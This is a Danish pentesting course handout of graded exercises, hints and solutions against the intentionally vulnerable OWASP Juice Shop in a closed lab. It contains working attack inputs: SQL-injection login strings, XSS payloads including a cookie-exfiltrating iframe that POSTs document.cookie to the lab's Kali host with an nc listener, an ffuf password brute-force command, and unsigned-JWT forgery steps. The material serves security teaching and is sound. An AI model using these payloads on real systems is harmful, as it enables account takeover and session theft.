# Introduktion 

Følgende er nogle opgaver til introduktion til pentesting med
Juiceshop. De fleste opgaver er direkte opgaver som man kan finde i
Juiceshop-applikationen. Man kan finde flere hints til at løse dem
der. Man kan finde løsninger på https://help.owasp-juice.shop/appendix/solutions.html

Alt efter hvor svært man vil gøre det for sig selv så gør følgende:

1. Løs opgaven uden hjælp
2. Løs opgaven med hints fra Juiceshop
3. Løs opgaven med mine hints
4. Løs opgaven med Tutorial fra Juiceshop
5. Løs opgaven med mine løsninger
6. Løs opgaven med løsninger fra https://help.owasp-juice.shop

Opgaver markeret med * er ikke opgaver fra JuiceShop. 

# Opgave 0: Setup*

## Start serveren

Gå ind i guacamole-miljøet, dvs gå til `http://podX.lab` hvor `X` er dit lab nummer

Gå ind på ’Tasks’ i sidebaren

Start ’VULNSRV01 – JuiceShop’ 

## Test forbindelsen

Åben Kali VNC og log ind 

Åben *chromium* browseren og skriv `192.168.1.20:3010` 

## Start Wazuh logging

Tilføj wazuh-agent til vulnsrv1 (som gennemgået i Network Security)

Tilføj stien til nginx-log filer til wazuh config, dvs rediger filen

`/var/ossec/etc/ossec.conf`

og tilføj følgende:

```
<ossec_config> 
  <localfile> 
    <log_format>syslog</log_format> 
    <location>/opt/juiceshop/logs/error.log</location> 
  </localfile> 

  <localfile> 
    <log_format>syslog</log_format> 
    <location>/opt/juiceshop/logs/access.log</location> 
  </localfile> 
</ossec_config> 
```

Genstart wazuh-agent med `sudo systemctl restart wazuh-agent`

Test at agenten virker, ved f.eks. at prøve at besøge 

`192.168.1.20:3010/rest/foo` 

hvilket provokerer en fejl, som bør logges i wazuh.

## Brows rundt

Brug 5 minutter på at bruge hjemmesiden som den er designet. 

Prøv f.eks. at oprette en bruger, logge ind, ændr password, lave et review, etc 

# Opgave 1: Med devtools 

## Improper Input Validation 

### Score Board 

Denne opgave omhandler ikke Improper Input Validation, men skal løses
for at få adgang til Score Board'et. Bemærk, at efter man har fundet
det een gang, så optræder Score Board'et i sidebaren.

<details>
<summary>Hints</summary>

1. har du søgt efter 'score' eller 'board'? 

2. i `main.js` indikerer `path:"foo"` at man kan gå ind på
`/#/foo`. 

3. søg efter `path:"scor` for at finde den rigtige URL
</details>

<details>
<summary>Løsning</summary>
1. gå til `/#/score-board`
</details>

### Repetitive Registration 

Målet med denne opgave er at omgå et krav om, at man skal skrive sine
kode to gange. Dette bliver dog kun tjekket af browseren, og kan
derfor omgås.

<details>
<summary>Hints</summary> 

1. kan man evt. bare aktivere knappen? 

2. undersøg knappen, ved at inspicere den med devtools
</details>

<details>
<summary>Løsning</summary> 

1. start processen med at oprette en ny bruger

2. udfyld mail, password og security question, men undlad at gentage password

3. ’inspect’ registrer-knappen

4. ændr den, så alle html attributes, der indeholder noget med ’disabled’, er slettet

5. tryk på registrer-knappen
</details>

### Zero Stars 

Er det muligt at give hjemmesiden et 0-stjernet review? 

<details>
<summary>Hints</summary> 

1. undersøg 'Customer Feedback'-menuen

2. inspect de forskellige elementer i formularen
</details>

<details>
<summary>Løsning</summary>

1. find 'Customer Feedback'-menuen i sidebaren

2. inspect rating-elementet

3. ændr dets attribut 'min' til 0

4. enable submit-knappen (som i forrige opgave) og tryk på den
</details>

### Empty User Registration 

Er det muligt at registrere en bruger uden email? 

<details>
<summary>Hints</summary> 
1. prøv samme fremgangsmåde som Repetitive Registrations
</details>

<details>
<summary>Løsning</summary>
1. gør som i Repetitive Registration
</details>

## Injection 

### Login Admin 

Denne opgave handler om at logge ind som administrator.

<details>
<summary>Hints</summary>

1. hvis man ikke angiver email i login-formularen, så er admin-brugeren default-værdien

2. prøv at bruge SQL-injection i login-formularen
</details>

<details>
<summary>Løsning</summary>

1. gå til login-formularen

2. brug emailen "' OR 1=1--"

3. brug et vilkårligt password

4. login
</details>

### Admin Section 

Denne opgave handler ikke direkte om injection-angreb, men skal bruges
til at løse den næste opgave. Den handler om at finde
adminstrationssiden på Juiceshop.

<details>
<summary>Hints</summary> 

1. har du søgt efter ’admin’?

2. se hints til opgaven 'Score Board'
</details>

<details>
<summary>Løsning</summary>

1. login som administrator (forrige opgave)

2. gå til /#/administration
</details>

### Login Jim 

Denne opgave handler om at logge in som Jim uden at kende hans
kodeord, men hans email.

<details>
<summary>Hints</summary>

1. med admin adgang kan du finde Jims email 

2. brug den administrationsside du fandt i forrige opgave

3. efter du har fundet Jims email, prøv at brug den sammen med en SQL
   injection i login-formularen
</details>

<details>
<summary>Løsning</summary>

1. login som admin

2. find Jims email i /#/administration

3. login med emailen "JIMS-EMAIL' --" og en vilkårlig password
</details>

### Christmas Special

### Database Schema 

## XSS 

### DOM XSS 

Denne opgave handler om at få browseren til at køre noget javascript
vi giver som input.

<details>
<summary>Hints</summary>
1. hvad er det først input-felt man støder ind i på siden?
</details>

### Reflected XSS 

Denne opgave handler om at finde et sted hvor vi sender noget input
til serveren, som den så returnerer og viser i vores browser, uden at
fjerne scripts ordentligt.

<details>
<summary>Hints</summary>

1. prøv at bestille en ordre og find ordren under din profil

2. når du tracker din ordrer, bliver dit ordrenummeret vist i browseren 

3. hvad står der i URL'en og kan det evt udnyttes?
</details>

### Client-side XSS protection (persistent) 

<details>
<summary>Hints</summary>

1. løs 'Admin Section' først 

2. hvis man er admin, så kan man se kan man se brugeres email i admin-sektionen 

3. prøv at oprette bruger (med noget XSS)
</details>

### Stjæle cookies med XSS* 

Prøv at lave forrige opgave med følgende injectede script

`<iframe src="javascript: fetch('http://192.168.1.100:9000', {method: 'POST', body: document.cookie});">`

Bemærk, at `192.168.1.100` er Kali'ens IP-addresse.

Start desuden en netcat process på Kali'en der lytter på port 9000 ved
at køre følgende kommando:

```
nc -l -p 9000 
```

Prøv derefter at logge ind som admin og besøg den side hvor scriptet er injected.

Prøv til sidst at bruge den cookie i eksfiltrerer til at logge ind med.

# Opgave 2: Med Burp Suite 

## Setup*

Ved opstart, bare vælg alle default indstillinger. Bemærk, at man kun
kan have midlertidige projekter med community edition af Burp Suite.

- Target -> Scope:
  - 'Include in Scope' 192.168.1.20:3010
  - 'Exclude from Scope' 192.168.1.20:3010/socket.io

- Target -> Site map -> Site map filter (klik)
- Tjek 'Show only in-scope items'
- 'Apply and close'

- Proxy -> HTTP history -> Filter (klik)
- Tjek 'Show only in-scope items'
- 'Apply and close'

## Discovery*

Brows rundt på siden for at udfylde 'Site map'

## Improper Input Validation 

### Evt. de forrige opgaver m. intercept/repeater

### Deluxe Fraud 

I denne opgave skal man forsøge at opgradere til 'Deluxe Membership'
uden at betale.

<details>
<summary>Hints</summary>

1. undersøg trafikken der bliver sendt når man betaler for deluxe membership

2. brug burp intercept 

3. prøv at modificere feltet 'paymentMode' inden du forwarder requesten
</details>

### Payback Time 

I denne opgave skal man prøve at gennemføre et køb der gør en rig.

<details>
<summary>Hints</summary>

1. undersøg trafikken der bliver sendt når man putter genstande i sin kurv

2. brug burp intercept

3. hvordan kan man modificere requesten så man tjener penge?
</details>

### Admin Registration

I denne opgave skal man forsøge at registrere en ny bruger som administrator.

<details>
<summary>Hints:</summary>

1. undersøg om du opfanget noget trafik på endpointet `/api/Users`,
   ellers prøv at oprette en ny bruger

2. se efter om der måske er nogle felter i responsen, som ville kunne
   bruges

3. brug repeater eller intercept til at tilføje et "role" felt i en
   `POST`-request der opretter en ny bruger
</details>

## XSS 

### Evt. de forrige opgaver 

### Server-side XSS protection (persistent)

I denne opgave skal man lave et persistent XSS som omgår server-side
beskyttelse. Dvs. beskyttelse der ikke bliver kørt i browseren, så det
kan f.eks. ikke omgås som i de tidligere XSS opgaver.

<details>
<summary>Hints</summary>

1. undersøg hvordan 'Customer Feedback' bliver håndteret

2. prøv at sende forskellige varianter af XSS-strenge med Burp
   Repeater, og se man kan finde et mønster

3. det ser ud til at serveren fjerner <iframe ... />, men hvad sker
   der hvis man sender rekursive iframes? F.eks `<iframe <iframe/>>`
</details>

### API-only XSS 

I denne opgave skal man lave et persistent XSS som ikke bruger
webinterfacet. Dvs. man er nødt til at bruge Burp (eller et andet
værktøj) til at 'gætte' sig til nogle åbne API'er i webappen, som ikke
er tilgængelig via browseren.

<details>
<summary>Hints</summary>

1. brug `Site map` til at se hvilke endpoints der under `/api/` og
   forsøg at sende POSTs til nogen af dem

2. brug de `GET`-responses der ligger til at finde ud af hvordan din
   `POST`-requests skal se ud

3. til denne opgave vil vi gerne tilgå et API som ikke er tilgængelig
   i webinterfacet

4. prøv at tilføje et nyt produkt (med en XSS payload)
</details>

## Password Strength 

Brug Burp Intruder til at bruteforce kodeordet til admin@juice-sh.op. 

Brug `/usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt`

Hvis det er for langsomt, så brug evt `ffuf` som alternativ med kommandoen
```
ffuf -w /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
     -u 'http://192.168.1.20:3010/rest/user/login' \
     -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
     -H "Content-Type: application/json" \
```

## Opgave 3: Sessionshåndtering 

### Find JWT og afkod den for at se hvad den indeholder* 

### Unsigned JWT 

JWT understøtter en meget dårlig form for `alg`, som ikke bør blive
godkendt af backenden.

<details>
<summary>Hints</summary>

1. find først en valid JWT og dekod den

2. ændr `alg` i headeren af JWT'en til noget usikkert og ændr emailen
   i payloaden til `jwtn3d@juice-sh.op`

3. enkod headeren og payloaden for sig i `base64url`, brug evt en
   online værktøj såsom https://jwt.io

4. besøg f.eks. `/rest/user/whoami` med headeren `Authorization:
   Bearer (encoded header).(encoded payload).`
</details>

### Brug JWT til at logge ind på konto efter password ændring* 
